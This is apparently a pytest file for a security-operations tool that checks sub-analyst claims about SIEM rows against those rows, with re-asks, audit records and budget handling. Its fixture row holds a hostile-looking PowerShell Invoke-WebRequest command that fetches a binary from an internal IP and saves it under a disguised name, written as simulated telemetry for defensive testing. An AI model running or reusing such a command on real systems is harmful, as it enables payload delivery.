"""B52 E: sub-analyst observations checked against the rows they cite.

The grounding gate checks that a citation resolves and that its figures are in
the rows. This checks what that gate cannot: a line citing real rows that do not
say what it claims. A verifier model reads each presence line beside its rows;
an unsupported line goes back to the sub-analyst once, and is dropped (kept in
the audit record) if it still fails.
"""

from __future__ import annotations

import asyncio
import json
from types import SimpleNamespace

from contracts import DomainFinding, ResultSet

from smartops.budget import Budget
from smartops.subagent_analysts.analyze import _check_claims
from smartops.subagent_analysts.model import AnalystResponse
from smartops.subagent_analysts.routing import DomainSlice
from smartops.subagent_analysts.verify import Verdict, Verdicts, claim_verifier

_ROWS = [{"host": "HOST-1", "process": "powershell.exe Invoke-WebRequest http://192.168.77.211/update/a.bin -OutFile svcupdate.dat"}]
GOOD = "HOST-1 ran powershell.exe with Invoke-WebRequest to http://192.168.77.211/update/a.bin. [processes#1]"
BAD = "HOST-1 ran cmd.exe deleting shadow copies. [processes#1]"
EMPTY_ONLY = "No file writes were returned. [file_events#1]"


def _slice() -> DomainSlice:
    return DomainSlice(
        domain="endpoint",
        siem_sets=[
            ("processes", ResultSet(query="q", row_count=len(_ROWS), rows=_ROWS)),
            ("file_events", ResultSet(query="q2", row_count=0, rows=[])),
        ],
    )


def _finding(*lines: str) -> DomainFinding:
    return DomainFinding(domain="endpoint", narrative="n", observations=list(lines),
                         citations=["processes#1", "file_events#1"])


class _Verifier:
    """Answers each call from a queue; `bad` lines are the unsupported ones."""

    def __init__(self, *bad_per_call: set[str], skip: bool = False):
        self._bad = list(bad_per_call)
        self.calls: list[list[tuple[str, str]]] = []
        self._skip = skip

    async def __call__(self, claims):
        self.calls.append(claims)
        if self._skip:
            return None
        bad = self._bad.pop(0) if self._bad else set()
        return [Verdict(index=i, supported=line not in bad, reason="" if line not in bad else "row shows powershell.exe")
                for i, (line, _) in enumerate(claims)]


class _Model:
    def __init__(self, generation: str):
        self.generation = generation
        self.users: list[str] = []

    def invoke(self, system: str, user: str) -> AnalystResponse:
        self.users.append(user)
        return AnalystResponse(generation=self.generation, prompt_tokens=1, generation_tokens=1, stop_reason="stop")


def _run(finding, model, verifier):
    return asyncio.run(_check_claims(finding, _slice(), model, verifier))


def test_a_supported_line_is_untouched_and_marked_checked():
    verifier = _Verifier(set())
    out = _run(_finding(GOOD), _Model("unused"), verifier)
    assert out.observations == [GOOD]
    assert out.unsupported == []
    assert out.claim_check == "checked"


def test_lines_citing_only_empty_sets_are_never_sent():
    verifier = _Verifier(set())
    out = _run(_finding(GOOD, EMPTY_ONLY), _Model("unused"), verifier)
    assert [line for line, _ in verifier.calls[0]] == [GOOD]
    assert "Invoke-WebRequest" in verifier.calls[0][0][1]  # the cited rows travel with the line
    assert out.observations == [GOOD, EMPTY_ONLY]


def test_a_misread_line_is_corrected_by_the_one_reask():
    fixed = "HOST-1 ran powershell.exe with Invoke-WebRequest writing svcupdate.dat. [processes#1]"
    model = _Model(f"<think>x</think>\n1: {fixed}")
    verifier = _Verifier({BAD}, set())
    out = _run(_finding(GOOD, BAD), model, verifier)
    assert "row shows powershell.exe" in model.users[0] and BAD in model.users[0]
    assert out.observations == [GOOD, fixed]
    assert out.unsupported == []
    assert len(verifier.calls) == 2 and [line for line, _ in verifier.calls[1]] == [fixed]


def test_a_line_still_unsupported_after_the_reask_is_dropped_and_audited():
    model = _Model(f"1: {BAD}")
    verifier = _Verifier({BAD}, {BAD})
    out = _run(_finding(GOOD, BAD), model, verifier)
    assert out.observations == [GOOD]
    assert out.unsupported == [f"{BAD} -- row shows powershell.exe"]


def test_a_withdrawn_line_is_dropped_without_a_second_check():
    verifier = _Verifier({BAD})
    out = _run(_finding(GOOD, BAD), _Model("1: WITHDRAWN"), verifier)
    assert out.observations == [GOOD]
    assert out.unsupported == [f"{BAD} -- row shows powershell.exe"]
    assert len(verifier.calls) == 1


def test_a_correction_citing_a_set_without_rows_is_not_kept():
    model = _Model("1: HOST-1 wrote a.bin. [file_events#1]")
    verifier = _Verifier({BAD})
    out = _run(_finding(GOOD, BAD), model, verifier)
    assert out.observations == [GOOD]
    assert len(out.unsupported) == 1


def test_a_skipped_verifier_changes_nothing_but_the_audit_mark():
    verifier = _Verifier(skip=True)
    out = _run(_finding(GOOD, BAD), _Model("unused"), verifier)
    assert out.observations == [GOOD, BAD]
    assert out.claim_check.startswith("skipped")


class _FakeChoice:
    pricing_key = "claude-haiku-5-5"

    def build(self):
        return object()


def _verifier(budget, invoke):
    return claim_verifier(_FakeChoice(), budget, invoke=invoke)


def test_the_verifier_reserves_settles_and_returns_the_verdicts():
    budget = Budget.from_usd(1.0)
    seen = []

    async def invoke(choice, prompt):
        seen.append(prompt)
        assert budget.remaining < 1_000_000  # reserved before the call
        return SimpleNamespace(
            structured_output=Verdicts(verdicts=[Verdict(index=0, supported=True)]),
            metrics=SimpleNamespace(accumulated_usage={"inputTokens": 100, "outputTokens": 10}, agent_invocations=[]),
        )

    out = asyncio.run(_verifier(budget, invoke)([(GOOD, "rows here")]))
    assert out == [Verdict(index=0, supported=True)]
    assert GOOD in seen[0] and "rows here" in seen[0]
    assert [e.role for e in budget.ledger] == ["verify"]


def test_a_budget_refusal_skips_the_call():
    calls = []

    async def invoke(choice, prompt):
        calls.append(prompt)

    assert asyncio.run(_verifier(Budget(0), invoke)([(GOOD, "rows")])) is None
    assert calls == []


def test_a_failed_call_releases_the_reservation_and_skips():
    budget = Budget.from_usd(1.0)

    async def invoke(choice, prompt):
        raise RuntimeError("bedrock down")

    assert asyncio.run(_verifier(budget, invoke)([(GOOD, "rows")])) is None
    assert budget.remaining == 1_000_000 and budget.ledger == []


def test_traces_json_carries_the_check(tmp_path):
    from smartops.broker import _persist_reasoning_traces

    finding = _finding(GOOD).model_copy(update={"unsupported": ["x -- y"], "claim_check": "checked"})
    _persist_reasoning_traces("T1", "H1", [finding], run_dir=tmp_path)
    trace = json.loads((tmp_path / "traces.json").read_text(encoding="utf-8"))["traces"][0]
    assert trace["unsupported"] == ["x -- y"] and trace["claim_check"] == "checked"


def test_equal_lines_are_separate_claims():
    """Two copies of one line: the verifier rules on each position on its own."""
    fixed = "HOST-1 ran powershell.exe. [processes#1]"
    verifier = _Verifier({BAD}, set())
    model = _Model(f"1: {fixed}\n2: WITHDRAWN")
    out = _run(_finding(BAD, BAD), model, verifier)
    assert out.observations == [fixed]
    assert len(out.unsupported) == 1


def test_an_incomplete_verdict_list_is_a_skipped_check():
    class _Partial(_Verifier):
        async def __call__(self, claims):
            self.calls.append(claims)
            return []

    out = _run(_finding(GOOD, BAD), _Model("unused"), _Partial())
    assert out.observations == [GOOD, BAD]
    assert out.claim_check.startswith("skipped")


def test_a_skipped_recheck_lets_neither_the_line_nor_its_fix_cross():
    class _SkipSecond(_Verifier):
        async def __call__(self, claims):
            if self.calls:
                self.calls.append(claims)
                return None
            return await super().__call__(claims)

    out = _run(_finding(GOOD, BAD), _Model("1: HOST-1 ran powershell.exe. [processes#1]"), _SkipSecond({BAD}))
    assert out.observations == [GOOD]
    assert out.claim_check == "checked; re-check skipped, fixes dropped"


def test_a_fix_is_rechecked_against_the_rows_it_cites():
    rows2 = [{"host": "HOST-1", "process": "rundll32.exe"}]
    slice_ = DomainSlice(domain="endpoint", siem_sets=[
        ("processes", ResultSet(query="q", row_count=1, rows=_ROWS)),
        ("processes", ResultSet(query="q3", row_count=1, rows=rows2)),
    ])
    line = "HOST-1 ran cmd.exe. [processes#1] [processes#2]"
    fix = "HOST-1 ran powershell.exe. [processes#1]"
    verifier = _Verifier({line}, set())
    finding = DomainFinding(domain="endpoint", narrative="n", observations=[line], citations=["processes#1", "processes#2"])
    out = asyncio.run(_check_claims(finding, slice_, _Model(f"1: {fix}"), verifier))
    assert out.observations == [fix]
    assert "rundll32" in verifier.calls[0][0][1] and "rundll32" not in verifier.calls[1][0][1]


def test_an_answer_given_twice_does_not_stand():
    out = _run(_finding(GOOD, BAD), _Model("1: HOST-1 ran powershell.exe. [processes#1]\n1: WITHDRAWN"), _Verifier({BAD}))
    assert out.observations == [GOOD]


def test_each_verify_request_is_capped_within_the_reservation(monkeypatch):
    import strands

    from smartops.subagent_analysts import verify

    class _Model:
        config: dict = {}

        def update_config(self, **kw):
            self.config.update(kw)

    class _Agent:
        def __init__(self, model, **_):
            self.model = model

        async def invoke_async(self, prompt, limits):
            return SimpleNamespace(limits=limits, model=self.model)

    class _Choice:
        provider = None

        def build(self):
            return _Model()

    monkeypatch.setattr(strands, "Agent", _Agent)
    out = asyncio.run(verify._invoke(_Choice(), "p"))
    assert out.model.config["max_tokens"] * out.limits["turns"] <= verify._MAX_OUTPUT_TOKENS
    assert out.limits["output_tokens"] == verify._MAX_OUTPUT_TOKENS
